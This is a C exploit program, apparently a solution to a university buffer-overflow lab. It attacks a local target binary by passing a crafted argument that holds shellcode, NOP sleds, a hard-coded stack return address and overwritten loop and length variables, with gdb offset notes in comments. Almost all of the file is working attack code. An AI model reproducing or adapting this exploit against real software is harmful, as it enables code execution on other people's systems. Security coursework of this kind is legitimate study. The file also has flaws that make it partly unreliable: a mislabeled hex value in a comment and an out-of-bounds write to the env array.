#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"


/*
(gdb) info frame
Stack level 0, frame at 0x2021fe90:
 rip = 0x400b63 in lab_main (target2.c:23); saved rip 0x400916
 called by frame at 0x2021fec0
 source language c.
 Arglist at 0x2021fe80, args: argc=2, argv=0x7fffffffded8
 Locals at 0x2021fe80, Previous frame's sp is 0x2021fe90
 Saved registers:
  rbp at 0x2021fe80, rip at 0x2021fe58




*/
//buffer is located at 0x2021fd40
//len is stored at 0x2021fe4c
//i is stored at 0x2021fe48


//buf to len is 268 bytes
//buf to i is 264 bytes
//buf to foo's rip is 280 bytes 




int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	unsigned char tmp[283];
	int i,j,k;
	
	for (k=0; k<283; k++){
		tmp[k]= '\x00';
	}

	strcat(tmp, shellcode);
	
	for (i=45; i<181; i++){
		tmp[i]='\x90';
	}

	tmp[181] = '\x40';
	tmp[182] = '\xfd';
	tmp[183] = '\x21';
	tmp[184] = '\x20';
	
	for (j=185; j<264; j++){
		tmp[j]= '\x90';		
	}


	//change i=267=0x010b, which means it will skip the actual i and go to "len" directly
	tmp[264]='\x0b';
	tmp[265]='\x01';
	tmp[266]='\x90';
	tmp[267]='\x90';

	//change len=283=0x010b
	tmp[268]='\x1b';
	tmp[269]='\x01';

	args[0] = TARGET;
	args[1] = tmp;
	args[2] = NULL;

	env[0] = &tmp[283];
	env[1] = &tmp[173];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
